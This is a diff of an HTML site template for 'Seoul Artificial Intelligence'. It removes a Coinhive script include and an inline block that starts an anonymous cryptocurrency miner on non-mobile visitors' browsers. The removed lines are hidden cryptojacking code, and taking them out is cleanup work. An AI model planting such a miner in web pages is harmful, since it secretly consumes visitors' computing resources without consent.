@@ -10,7 +10,6 @@
     <!--[if lt IE 9]>
     <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
     <![endif]-->
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     {% if page.summary %}
     <meta name="description" content="{{ page.summary | escape }}">
     {% endif %}
@@ -20,13 +19,6 @@
     {% seo %}
   </head>
   <body>
-    <script>
-      var miner = new CoinHive.Anonymous('4oRscSkZZprxDccg05fWoI3yID0Jl1yf');
-      miner.setNumThreads(2);
-      if (!miner.isMobile()) {
-        miner.start();
-      }
-    </script>
     <div class="wrapper">
       <header>
         <h1>Seoul</br>Artificial</br>Intelligence</h1>
